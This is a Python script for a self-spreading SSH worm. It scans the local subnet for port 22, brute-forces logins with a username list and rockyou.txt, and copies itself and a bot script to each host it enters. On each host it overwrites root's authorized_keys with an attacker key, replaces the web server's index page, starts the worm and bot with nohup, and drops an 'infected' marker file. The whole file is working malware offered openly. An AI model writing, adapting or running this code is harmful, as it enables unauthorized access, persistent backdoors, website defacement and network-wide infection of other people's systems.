#!/usr/bin/env python3
import paramiko
import sys
import nmap
import socket
import os #imports we need

#color codes
RESET = '\033[0m'
BOLD = '\033[01m'
BLUE = '\033[94m'
DARKBLUE = '\033[34m'
GREEN = '\033[92m'
RED = '\033[91m'
PURPLE = '\033[95m'
DARKPURPLE = '\033[35m'
ORANGE = '\033[33m'

print(DARKPURPLE + """
.▄▄ · ▄• ▄▌·▄▄▄▄        .▄▄ · ▄• ▄▌·▄▄▄▄        
▐█ ▀. █▪██▌██▪ ██ ▪     ▐█ ▀. █▪██▌██▪ ██ ▪     
▄▀▀▀█▄█▌▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄█▌▐█▌▐█· ▐█▌ ▄█▀▄ 
▐█▄▪▐█▐█▄█▌██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄█▌██. ██ ▐█▌.▐▌
 ▀▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀█▄▀▪
        
            A tool by: Jeffrey Lee, Ebrahim Kardooni and Stephen Kuchinski
        \n""" + RESET)

#port scanner
def getPorts():
    pScanner = nmap.PortScanner()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #how we keep track of the current ip
    s.connect(('4.2.2.2',80))
    cIP = s.getsockname()[0]
    pScanner.scan(cIP + '/24', arguments='-p 22 --open')
    hInfo = pScanner.all_hosts()
    upHosts = []
    for host in hInfo:
        if pScanner[host].state() == "up":
            upHosts.append(host)
    upHosts.remove(cIP)
    return upHosts

#proof of infection file/process
PROOF_OF_INFECTION = "/tmp/proof_of_infection.txt"

def PoI():
    proof = open(PROOF_OF_INFECTION, "w")
    proof.write(DARKPURPLE + """You have been infected by....
            
.▄▄ · ▄• ▄▌·▄▄▄▄        .▄▄ · ▄• ▄▌·▄▄▄▄        
▐█ ▀. █▪██▌██▪ ██ ▪     ▐█ ▀. █▪██▌██▪ ██ ▪     
▄▀▀▀█▄█▌▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄█▌▐█▌▐█· ▐█▌ ▄█▀▄ 
▐█▄▪▐█▐█▄█▌██. ██ ▐█▌.▐▌▐█▄▪▐█▐█▄█▌██. ██ ▐█▌.▐▌
 ▀▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀█▄▀▪
        
            A tool by: Jeffrey Lee, Ebrahim Kardooni and Stephen Kuchinski
        
        \n""" + RESET)
    proof.close()

#login list
userlist = []
passlist = []
file = open('usernames.txt', 'r')
passes = open('rockyou.txt', 'r', encoding='latin1') # here we open up our two text files for usernames and passwords, we convert the encoding to latin1 because ssh enjoys that
content = []
content2 = []
if file is not None:
    content = file.readlines()
    for line in content:
        userlist.append(line.strip('\n'))
    content2 = passes.readlines()
    for line2 in content2:
       passlist.append(line2.strip('\n'))
loginList = {userlist[i]: passlist[i] for i in range(len(userlist))} #make a simple dictionary of the usernames and passwords

#establishing ssh
def sshing(hostIP, user, passs):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostIP, username = user, password = passs)
    return ssh 
   
#bruteforcing ssh
def bruteForce(hostIP):
    ssh = False
    for k in loginList.keys():
        try:
            ssh = sshing(hostIP, k, loginList[k])
            if ssh:
                return ssh
        except:
            pass
    print(RED + "-" + "login failed" + RESET)
    return ssh

#infecting through ssh and sftp+here is also where we run our commands that we want before leaving the computer
def infect(ssh):
    sftpClient = ssh.open_sftp()
    sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
    sftpClient.put("/tmp/proof_of_infection.txt", "/tmp/proof_of_infection.txt")
    sftpClient.put("/tmp/bot.py", "/tmp/bot.py")
    sftpClient.put("/tmp/rockyou.txt", "/tmp/rockyou.txt")
    sftpClient.put("/tmp/usernames.txt", "/tmp/usernames.txt")
    sftpClient.put("/tmp/index.html", "/tmp/index.html")
    ssh.exec_command("echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZK434HVh72rOgcEd6vvIeR3BdvUtoWhSMTG40hauZnRA0b2yAC2j9WwnXB0sS1WNEkkI8gENJVAInZkyuujVg6CLLXODY8OtKDUO9dRIHWsdLH33MwHAgGjp4pJ0OGMmNpWG44xDrraDpUwxd19DyFz0RnBthnEfvRCI2aSrhxFOyAGcxyd0CGy79xEu8gmWvpXIy4vinVG/OAfbr+FXO4WNbnxGcGvlJB2x8/OTjtjipUaV41laLKju7zDb2qq9HEaeaeWhELCyTiR1gtnGVsSVSRgm2ejWRMwq0ffXMHfQGAT1N8fyW3N2kr2lFtCd366ELBNtkMvw5KZ/Vm3Y28L1vXnKtcfwqsba0o1YfRt4QR+zMXMmAq/jkeLOMvUsmlY2RbMGhqK2ZvlwokwT84sEQPV76EVv6Xg0h3+FAh3cqOoCYEKvzmTZKDwfjr5aqD7Cj9A0Q2eSsJ9JBzf4s71HCowQLuuuvMU1lYo5woF1wUFR7nOLcQaOogb8Y2s8= root@kali' > /root/.ssh/authorized_keys")
    ssh.exec_command("chmod +x /tmp/worm.py") #give ex perms to run on current machine
    ssh.exec_command("chmod +x /tmp/bot.py")
    ssh.exec_command("rm /var/www/html/index.html")
    ssh.exec_command("cp /tmp/index.html /var/www/html/index.html")
    ssh.exec_command("nohup python3 -u /tmp/bot.py > /tmp/bot.out")
    ssh.exec_command("nohup python3 -u /tmp/worm.py > /tmp/worm.out &") #nohup is used to keep the worm running on every machine it effects

def checkPoI(ssh2): #used to check PoI if no information can be found (producing a IOError) that will tell us it is not infected yet
    infected = False
    try:
        sftpClient = ssh2.open_sftp()
        sftpClient.stat(PROOF_OF_INFECTION)
        infected = True
    except IOError:
        rndmvar = "rndmvar"
    return infected 

#Grab upHosts
Hosts = getPorts() #create a list of hosts
PoI() #run the PoI function to prove infection initially

print(RED + "~Current network being infected..." + RESET)
for host in Hosts: #for each host in the Hosts
    ssh = None
    try:
        ssh = bruteForce(host) #bruteforce the host
        if ssh:        
            if checkPoI(ssh) == False: #run check
                try:
                    infect(ssh) #infect if not infected
                    PoI() #file to place
                    ssh.close() #close ssh
                except:
                    #print(RED + "-" + "Could not spread" + RESET)
                    continue
            else:
                randomvaris = "arandomvar"
    except socket.error:
        print(RED + "-" + "System went down? no connection made" + RESET) #just some error reporting if no connection is made or we are unable to authenticate
    except paramiko.ssh_exception.AuthenticationException:
        print(RED + "-" + "Wrong credentials/too many attempts" + RESET)

print(GREEN + "~Current network infected... " + RESET)
